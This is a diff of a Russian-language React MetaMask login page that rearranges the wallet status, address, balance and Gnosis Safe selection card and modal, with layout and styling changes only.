@@ -54,90 +54,84 @@ export default function MetamaskLoginPage() {
           </div>
         </div>
         <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-stretch">
-          {/* Левая часть */}
-          <div className="flex flex-col gap-5 h-full">
-            <div className="flex flex-col justify-between gap-5 bg-white/5 rounded-lg border border-white/10 shadow-sm p-5 h-full">
+          <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-5 h-full">
+            <div className="flex items-center justify-between mb-3">
+              <div>
+                <div className="text-xs text-gray-300">Статус</div>
+                <div className="text-lg text-white font-medium">{connected ? "Подключен" : "Не подключен"}</div>
+                <div className="text-xs text-gray-400 mt-1">
+                  Тип кошелька: <span className="text-white font-medium">{selectedSafe ? "Multisig (Gnosis Safe)" : "EOA"}</span>
+                </div>
+                {safeCandidates.length > 0 && (
+                  <select
+                    className="mt-2 px-2 py-1 rounded bg-gray-800 text-xs text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
+                    value={selectedSafe ? 'safe' : 'eoa'}
+                    onChange={e => {
+                      if (e.target.value === 'safe') {
+                        if (safeBalance && selectedSafe) return
+                      } else {
+                        if (selectedSafe) handleDismissSafe()
+                      }
+                    }}
+                  >
+                    <option value="eoa">EOA</option>
+                    {safeCandidates.map((s, i) => (
+                      <option key={i} value="safe">{s}</option>
+                    ))}
+                  </select>
+                )}
+              </div>
+              <div className="text-right">
+                <div className="text-xs text-gray-300">Chain</div>
+                <div className="text-sm text-white">{chainId ?? "—"}</div>
+              </div>
+            </div>
+            <div className="bg-black/20 border border-white/10 rounded-md p-3 flex flex-col gap-2">
               <div className="flex items-center justify-between">
-                <div>
-                  <div className="text-xs text-gray-300">Статус</div>
-                  <div className="text-lg text-white font-medium">
-                    {connected ? "Подключен" : "Не подключен"}
-                  </div>
-                  <div className="text-xs text-gray-400 mt-1">
-                    Тип кошелька: <span className="text-white font-medium">{selectedSafe ? "Multisig (Gnosis Safe)" : "EOA"}</span>
-                  </div>
-                  {safeCandidates.length > 0 && (
-                    <select
-                      className="mt-2 px-2 py-1 rounded bg-gray-800 text-xs text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
-                      value={selectedSafe ? 'safe' : 'eoa'}
-                      onChange={e => {
-                        if (e.target.value === 'safe') {
-                          if (safeBalance && selectedSafe) return
-                        } else {
-                          if (selectedSafe) handleDismissSafe()
-                        }
-                      }}
-                    >
-                      <option value="eoa">EOA</option>
-                      {safeCandidates.map((s, i) => (
-                        <option key={i} value="safe">{s}</option>
-                      ))}
-                    </select>
-                  )}
-                </div>
-                <div className="text-right">
-                  <div className="text-xs text-gray-300">Chain</div>
-                  <div className="text-sm text-white">{chainId ?? "—"}</div>
-                </div>
-              </div>
-              <div className="mt-4 space-y-2">
-                <div className="flex items-center gap-2 mb-2">
-                  <div className="text-xs text-gray-300">Адрес</div>
-                  {/* Dropdown for wallet selection if Safe available */}
-                  {(safeBalance || selectedSafe) && (
-                    <select
-                      className="ml-2 px-2 py-1 rounded bg-gray-800 text-xs text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
-                      value={selectedSafe ? 'safe' : 'eoa'}
-                      onChange={e => {
-                        if (e.target.value === 'safe') {
-                          if (safeBalance && selectedSafe) return; // already selected
-                        } else {
-                          if (selectedSafe) handleDismissSafe();
-                        }
-                      }}
-                    >
-                      <option value="eoa">EOA</option>
-                      {selectedSafe && <option value="safe">Safe</option>}
-                    </select>
-                  )}
-                </div>
-                <div className="text-sm text-white break-all">
-                  {selectedSafe ? selectedSafe : address ?? "—"}
-                </div>
-                <div className="text-xs text-gray-300 mt-2">Баланс (ETH)</div>
-                <div className="text-sm text-white">
-                  {selectedSafe ? safeBalance ?? "—" : balance ?? "—"}
-                </div>
-                <div className="mt-4 flex gap-2">
-                  <button
-                    type="button"
-                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
-                    onClick={disconnect}
+                <div className="text-xs text-gray-300">Адрес</div>
+                {(safeBalance || selectedSafe) && (
+                  <select
+                    className="ml-2 px-2 py-1 rounded bg-gray-800 text-xs text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
+                    value={selectedSafe ? 'safe' : 'eoa'}
+                    onChange={e => {
+                      if (e.target.value === 'safe') {
+                        if (safeBalance && selectedSafe) return
+                      } else {
+                        if (selectedSafe) handleDismissSafe()
+                      }
+                    }}
                   >
-                    Отключить
-                  </button>
-                  <button
-                    type="button"
-                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
-                    onClick={exportLogs}
-                  >
-                    Подтвердить
-                  </button>
-                </div>
-                <div className="mt-3 text-xs text-gray-400">
-                  Статус контракта: <span className="text-gray-300">{isContractConnected ? "Готов" : "Не готов"}</span>
-                </div>
+                    <option value="eoa">EOA</option>
+                    {selectedSafe && <option value="safe">Safe</option>}
+                  </select>
+                )}
               </div>
+              <div className="text-sm text-white break-all">
+                {selectedSafe ? selectedSafe : address ?? "—"}
+              </div>
+              <div className="flex justify-between mt-2">
+                <div className="text-xs text-gray-300">Баланс (ETH)</div>
+                <div className="text-sm text-white">{selectedSafe ? safeBalance ?? "—" : balance ?? "—"}</div>
+              </div>
+            </div>
+            <div className="flex gap-2 mt-4">
+              <button
+                type="button"
+                className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors"
+                onClick={disconnect}
+              >
+                Отключить
+              </button>
+              <button
+                type="button"
+                className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors"
+                onClick={exportLogs}
+              >
+                Подтвердить
+              </button>
+            </div>
+            <div className="mt-3 text-xs text-gray-400">
+              Статус контракта: <span className="text-gray-300">{isContractConnected ? "Готов" : "Не готов"}</span>
             </div>
           </div>
           <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-5 h-full">
@@ -153,11 +147,7 @@ export default function MetamaskLoginPage() {
               </ol>
             </div>
             <div>
-              {/* <div className="text-sm text-gray-200 mb-2 font-semibold tracking-wide">
-                Доступно к выводу
-              </div> */}
               <div className="bg-black/20 border border-white/10 rounded-md p-3 h-28 overflow-y-auto">
-                <br />
                 <div className="text-xs text-center text-gray-400 py-2">No data</div>
               </div>
             </div>
@@ -167,6 +157,7 @@ export default function MetamaskLoginPage() {
             </div>
           </div>
         </div>
+
         <div className="flex flex-col gap-4 mt-4 w-full">
           <div className="p-4 bg-gradient-to-br from-gray-800/80 to-gray-900/80 rounded-xl border border-white/10 shadow-inner flex flex-col">
             <div className="flex items-center justify-between mb-3">
@@ -212,19 +203,34 @@ export default function MetamaskLoginPage() {
           Политика конфиденциальности <br /> Служба поддержки
         </div>
         {safeModalVisible && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm">
+          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-xl transition-all duration-300">
             <div className="absolute inset-0" onClick={handleDismissSafe} />
             <div className="relative bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 border border-white/10 rounded-2xl shadow-2xl p-8 max-w-md w-full animate-fadeIn">
+              <button
+                onClick={handleDismissSafe}
+                className="absolute top-4 right-4 text-gray-400 hover:text-gray-200 transition-colors text-xl"
+              >
+                ×
+              </button>
               <div className="flex items-center gap-3 mb-5">
                 <svg width="32" height="32" fill="none" viewBox="0 0 24 24" className="text-yellow-400">
                   <path d="M12 2L2 7v7c0 5 4 8 10 8s10-3 10-8V7l-10-5z" stroke="currentColor" strokeWidth="2" strokeLinejoin="round" />
                 </svg>
-                <span className="text-xl font-bold text-white">Обнаружен Multisig</span>
+                <span className="text-xl font-bold text-white">Обнаружен Gnosis Safe</span>
               </div>
               <div className="text-sm text-gray-300 mb-6">
                 Выберите Safe для управления или используйте обычный кошелёк (EOA).
               </div>
               <div className="flex flex-col gap-3 mb-6">
+                {address && (
+                  <button
+                    type="button"
+                    onClick={handleDismissSafe}
+                    className="px-4 py-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-sm text-gray-100 font-semibold transition-all text-center"
+                  >
+                    {`EOA (${address.slice(0, 6)}...${address.slice(-4)})`}
+                  </button>
+                )}
                 {safeCandidates.map((s: string) => (
                   <button
                     key={s}
@@ -235,19 +241,11 @@ export default function MetamaskLoginPage() {
                     {`Multisig (${s.slice(0, 6)}...${s.slice(-4)})`}
                   </button>
                 ))}
-                {address && (
-                  <button
-                    type="button"
-                    onClick={handleDismissSafe}
-                    className="px-4 py-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-sm text-gray-100 font-semibold transition-all text-center"
-                  >
-                    {`EOA (${address.slice(0, 6)}...${address.slice(-4)})`}
-                  </button>
-                )}
               </div>
             </div>
           </div>
         )}
+
 
 
         <div className="absolute -top-6 left-1/2 -translate-x-1/2 flex flex-col items-center gap-3 z-50 pointer-events-none w-full max-w-xl px-4">
